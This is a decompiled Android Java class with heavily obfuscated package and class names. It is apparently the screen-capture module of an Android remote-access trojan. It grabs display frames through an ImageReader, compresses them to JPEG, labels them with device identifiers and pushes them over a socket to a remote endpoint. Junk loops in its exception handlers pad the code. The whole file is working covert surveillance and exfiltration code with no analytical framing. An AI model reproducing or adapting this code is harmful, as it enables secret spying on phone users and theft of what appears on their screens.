package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.graphics.Bitmap;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.view.Display;
import android.view.Surface;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.C0059e;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
/* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.a */
/* loaded from: classes.dex */
public class C0031a implements ImageReader.OnImageAvailableListener {

    /* renamed from: i */
    public static Object f117i = new Object();

    /* renamed from: a */
    private int f118a;

    /* renamed from: b */
    private int f119b;

    /* renamed from: c */
    private ImageReader f120c;

    /* renamed from: d */
    private crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 f121d;

    /* renamed from: e */
    private Bitmap f122e = null;

    /* renamed from: f */
    private String f123f;

    /* renamed from: g */
    private String f124g;

    /* renamed from: h */
    public Executor f125h;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.a$a */
    /* loaded from: classes.dex */
    public class RunnableC0032a implements Runnable {

        /* renamed from: a */
        final /* synthetic */ String f126a;

        /* renamed from: b */
        final /* synthetic */ byte[] f127b;

        RunnableC0032a(String str, byte[] bArr) {
            this.f126a = str;
            this.f127b = bArr;
        }

        @Override // java.lang.Runnable
        public void run() {
            try {
                synchronized (C0031a.f117i) {
                    byte[] m209s = C0045d.m209s(this.f126a, this.f127b);
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 unused = C0031a.this.f121d;
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f130k.setSendBufferSize(m209s.length);
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 unused2 = C0031a.this.f121d;
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 unused3 = C0031a.this.f121d;
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f131l = crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f130k.getOutputStream();
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 unused4 = C0031a.this.f121d;
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f131l.write(m209s, 0, m209s.length);
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 unused5 = C0031a.this.f121d;
                    crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f131l.flush();
                }
            } catch (Exception unused6) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public C0031a(crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27 crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27Var, String str, String str2) {
        try {
            this.f125h = new ThreadPoolExecutor(8, 15, 1L, TimeUnit.MINUTES, new ArrayBlockingQueue(C0045d.f187b));
            this.f121d = crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27Var;
            this.f123f = str;
            this.f124g = str2;
            Display defaultDisplay = crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27Var.m254h().getDefaultDisplay();
            Point point = new Point();
            try {
                defaultDisplay.getRealSize(point);
            } catch (Exception unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
            int i = point.x;
            int i2 = point.y;
            while (i * i2 > 1048576) {
                i >>= 1;
                i2 >>= 1;
            }
            this.f118a = i;
            this.f119b = i2;
            ImageReader newInstance = ImageReader.newInstance(i, i2, 1, crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f135p);
            this.f120c = newInstance;
            newInstance.setOnImageAvailableListener(this, crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27Var.m255g());
        } catch (Exception unused2) {
        }
    }

    /* renamed from: a */
    public void m267a(String str, byte[] bArr) {
        try {
            if (((ThreadPoolExecutor) this.f125h).getActiveCount() >= 1000) {
                return;
            }
            this.f125h.execute(new RunnableC0032a(str, bArr));
        } catch (NullPointerException unused) {
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: c */
    public int m265c() {
        return this.f119b;
    }

    /* renamed from: d */
    public Surface m264d() {
        return this.f120c.getSurface();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: e */
    public int m263e() {
        return this.f118a;
    }

    @Override // android.media.ImageReader.OnImageAvailableListener
    public void onImageAvailable(ImageReader imageReader) {
        Image image;
        try {
            try {
                image = this.f120c.acquireNextImage();
            } catch (IllegalStateException unused) {
                image = null;
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = this.f118a + ((planes[0].getRowStride() - (this.f118a * pixelStride)) / pixelStride);
                if (this.f122e == null || this.f122e.getWidth() != rowStride || this.f122e.getHeight() != this.f119b) {
                    if (this.f122e != null) {
                        this.f122e.recycle();
                    }
                    this.f122e = Bitmap.createBitmap(rowStride, this.f119b, Bitmap.Config.ARGB_8888);
                }
                this.f122e.copyPixelsFromBuffer(buffer);
                image.close();
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                Bitmap.createBitmap(this.f122e, 0, 0, this.f118a, this.f119b).compress(Bitmap.CompressFormat.JPEG, crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f134o, byteArrayOutputStream);
                byte[] byteArray = byteArrayOutputStream.toByteArray();
                String str = C0059e.m176g(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s, "BL", Boolean.FALSE) ? "B" : "n";
                m267a(C0045d.f194i + ":" + this.f124g + ":" + this.f123f + ":" + crwvbhfoasvboujynkxkqqqqgbfhwupgrvjiurdbdxwbalzoff27.f136q + ":" + str, C0045d.m216l(byteArray));
            }
        } catch (Exception unused2) {
            Boolean bool2 = Boolean.TRUE;
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
        }
    }
}
